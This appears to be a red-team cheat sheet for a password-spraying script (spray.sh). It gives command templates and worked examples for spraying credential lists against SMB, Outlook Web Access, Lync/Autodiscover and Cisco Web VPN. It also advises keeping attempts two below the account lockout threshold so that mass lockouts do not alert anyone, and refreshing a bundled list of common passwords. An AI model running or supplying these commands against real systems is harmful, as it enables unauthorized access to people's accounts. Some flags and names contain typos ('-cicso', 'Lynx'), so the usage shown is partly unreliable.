** Note:  For the most current Spray-Password-List, please see Gogs / Wordlists **


Password Spray using SMB:

spray.sh -smb {targetIP} {path/usernameList_file} {path/password.lst} {AttemptsPerLockoutPeriod} {LockoutPeriodInMinutes} {Domain}

  Example: spray.sh -smb 192.168.0.1 /root/working/external/users-names.txt pswd.lst 3 15 edd



Password Spray Against Exposed OWA Instance:

spray.sh -owa {targetIP} {path/usernameList_file} {path/password.lst} {AttemptsPerLockoutPeriod} {LockoutPeriodInMinutes} {test-owa-submission-POST(see burp).txt}
    Example: spray.sh -owa 192.168.0.1 usernames.txt pswd.lst 3 15 post-request.txt



Password Spraying Against Exposed Lynx Instance (Autodiscover):

spray.sh -lync {lyncDiscoverOrAutodiscoverUrl} {path/emailAddressList} {path/password.lst} {AttemptsPerLockoutPeriod} {LockoutPeriodInMinutes}
    Example: spray.sh -lync https://lyncweb.company.com/Autodiscover/AutodiscoverService.svc emails.txt passwords.txt 3 15


Password Spraying Against Exposed Cisco Web VPN:

spray.sh -cisco {targetURL} {path/usernameList_file} {path/password.lst} {AttemptsPerLockoutPeriod} {LockoutPeriodInMinutes}
    Example: spray.sh -cicso 192.168.0.1 usernames.txt pswd.lst 3 15


Notes:  

(1) Inside the folder is a test of common password spraying terms (as of January 2019), that includes 158 possible options.  Prior to using the password file, validate the passwords are relivant for the year, add anything you this might work, and delete ones you dont want to test with.

(2) When setting the AttemptPerLockoutPeriod, know the password policy and set it to be 2 less than lockout to lower the possibility of massive account lockout!
